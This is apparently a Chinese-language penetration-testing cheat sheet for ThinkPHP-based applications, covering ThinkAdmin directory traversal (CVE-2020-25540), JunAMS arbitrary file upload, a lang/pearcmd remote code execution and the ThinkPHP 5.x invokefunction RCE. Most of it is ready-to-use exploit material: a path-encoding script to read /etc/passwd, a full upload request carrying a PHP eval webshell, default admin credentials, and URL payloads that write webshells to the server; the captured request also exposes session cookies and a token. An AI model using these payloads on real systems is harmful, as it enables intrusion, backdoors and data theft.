### 指纹

网站的标头中有：`X-Powered-By:ThinkPHP`

工具推荐：莲花，蓝鲸

### thinkadmin 目录遍历（CVE-2020-25540）

thinkadmin是采用thinkphp框架开发的一套程序

##### 版本

Thinkadmin v6

##### 利用

参考文章：

[ThinkAdminV6 CVE-2020-25540 目录遍历文件读取漏洞_thinkadmin 目录遍历 (cve-2020-25540)-CSDN博客](https://blog.csdn.net/qq_40929683/article/details/121486899)

[云镜CVE-2020-25540复现-CSDN博客](https://blog.csdn.net/m0_46684679/article/details/129231011)

1.先打开在线PHP运行网站，并修改以下代码中的路径

```
<?php 
	function encode($content){
		list($chars, $length) = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))];
		for ($i = 0; $i < $length; $i++) 
			$chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
		return $chars;}$content="../../../../etc/passwd";
	echo encode($content);
?>

```

2.运行代码，得出加密后的密文

3.拼接路径：

http://xx.xx.xx:xx/admin.html?s=admin/api.Update/get/encode/密文

4.读取到的内容进行base64解密即可获取内容

### junams 文件上传（CNVD-2020-24741）

junams是采用thinkphp框架开发的一套程序

JunAMS是一款以ThinkPHP为框架的开源内容管理系统。 JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。 后台路径 /admin.php admin:admin。

##### 版本

JunAMS 1.2.1.20190403

##### 原理

[JunAMS v1.2.1.20190403代码审计笔记 - cHr1s_h - 博客园](https://www.cnblogs.com/cHr1s/p/14263008.html)

[junams 文件上传 （CNVD-2020-24741）复现-CSDN博客](https://blog.csdn.net/YouthBelief/article/details/121403512#:~:text=整个上传流程为：获取图片文件后缀、Mime类型、内容，当后缀为图片文件时，检测内容是否为图片，当后缀不为图片文件时，定义上传目录与文件名，上传成功，返回文件路径。)

目标文件上传点的上传流程为：获取图片文件后缀、Mime类型、内容，当后缀为图片文件时，检测内容是否为图片.

但当后缀不为图片文件时，定义上传目录与文件名，上传成功，返回文件路径。并且common方法没有受后台权限验证基类Backend限制，任意用户可访问，产生前台任意文件上传漏洞。

##### 利用

[junams 文件上传 （CNVD-2020-24741）_junams 文件上传 (cnvd-2020-24741)-CSDN博客](https://blog.csdn.net/qq_23003811/article/details/140762302)

1.进入后台：/admin.php/login/index.html【默认账户密码：admin admin】

2.在系统设置->版本管理->添加中，发现“添加新版本”弹窗中的更新内容中有个上传图片的文件上传功能点

3.通过在上边的 html源代码中，添加一个表单上传功能【修改action=''中的url来触发文件上传】

```html
<form enctype="multipart/form-data" action="http://vulfocus.fofa.so:59218//admin.php/common/add_images.html" method="post">  
<input type="file" name="file" size="50"><br>  
<input type="submit" value="Upload">  
</form>

```

- 第三步没看懂

4.请求包中上传shell

```
POST //admin.php/common/add_images.html HTTP/1.1
Host: vulfocus.fofa.so:9461
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------326774743432415414462475084350
Content-Length: 267
Origin: http://vulfocus.fofa.so:9461
Connection: close
Referer: http://vulfocus.fofa.so:9461/admin.php/edition/add.html
Cookie: Hm_lvt_deaeca6802357287fb453f342ce28dda=1636957776,1637035618,1637078936,1637219652; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1636704940,1636709021,1636825689,1637222671; _ga=GA1.2.744261971.1636781886; Hm_lpvt_deaeca6802357287fb453f342ce28dda=1637221849; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0ODQ1LCJ1c2VybmFtZSI6IllvdXRoQmVsaWVmIiwiZXhwIjoxNjM3MzA2MDA0LCJlbWFpbCI6IjI0NTU1NjQ2NEBxcS5jb20ifQ.4Gr7Mkd6jMvSpaNITDQoww0jUnSP1d59O34IpzyDpmI; PHPSESSID=7jrca24napuo1umgs5s58dfhvu; _gid=GA1.2.277758474.1637219810; ktqnjecmsdodbdata=empirecms; ktqnjeloginlic=empirecmslic; ktqnjloginadminstyleid=1; ktqnjlogintime=1637222551; ktqnjtruelogintime=1637222430; ktqnjloginuserid=1; ktqnjloginusername=admin; ktqnjloginrnd=5I62uWWbyxT9vB9Fi6FU; ktqnjloginlevel=1; ktqnjloginecmsckpass=35f1e6e02526a8193d735f89d9093f80; ktqnjloginecmsckfrnd=gkgk52G7rpQ6xWOHlfLWxgdFpG9; ktqnjloginecmsckfdef=N0VHyuu3ljnoPVbceYkXaX; ktqnjemecOYNqOjnu=BXWggMbbslguQiExvN; Hm_lpvt_b5514a35664fd4ac6a893a1e56956c97=1637222890; thinkphp_show_page_trace=0|0; eth0_time=1637226896; eth0_num=0; eth0=249.118; login_auto=YXs3g0Y%3D%7C0e2c7f3efd15db77ba3f2ec9ab35f8347cb5be0d
Upgrade-Insecure-Requests: 1

-----------------------------326774743432415414462475084350
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: application/octet-stream

<?php eval($_REQUEST[1]); ?> 
-----------------------------326774743432415414462475084350--


```



### lang 命令执行

#####  版本

6.0.1 <= ThinkPHP <= 6.0.13
ThinkPHP 5.0.x
ThinkPHP 5.1.x

##### 原理：

知识储备：

HTML之lang属性：lang属性的作用就是用来定义元素中使用的语言

PEAR:PEAR也就是为[PHP](https://www.baidu.com/s?wd=PHP&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd)扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库。

Pearcmd：pearcmd.php是pear工具调用的功能文件，pear是管理php的扩展管理工具， 可以理解为php的命令行工具

config-create：创建文件，该方法需接收两个参数，第一个参数是写入文件的内容，第二个参数是写入文件的路径

------

通过GET请求url中lang参数传参调用php版的命令行Pearcmd，执行方法config-create创建后门

##### 利用

抓包并丢到repeater模块并修改包添加payload：

```
?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['caixiaogaun']);?>+/var/www/html/666.php
```

 payload注释：

```
使用lang参数
../../../../../../../../  一直退到根目录（需存在目录遍历漏洞）

/usr/local/lib/php/pearcmd  需要用到pearcmd

&+config-create+/<?=@eval($_REQUEST['caixiaogaun']);?>+/var/www/html/666.php   将一句话木马写入到/var/www/html/666.php中
```

##### 修复

php.ini中的register_argc_argv设置为Off，禁止url传入命令行参数；或升级版本。

### 远程命令执行（CVE-2018-1002015）|CNVD-2018-24942

##### 版本

ThinkPHP 5.x < 5.1.31, <= 5.0.23

##### 利用

```
/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=webshell.php&vars[1][]=<?php%20eval($_GET[cmd]);?>
```

![img](https://i-blog.csdnimg.cn/blog_migrate/58c5474f900fb4a09b8641283da7d04e.png)

### ThinkPHP6.0.12LTS反序列化

直接把exp塞到表单中提交，url写x.x.x.x/public/?s=Index/test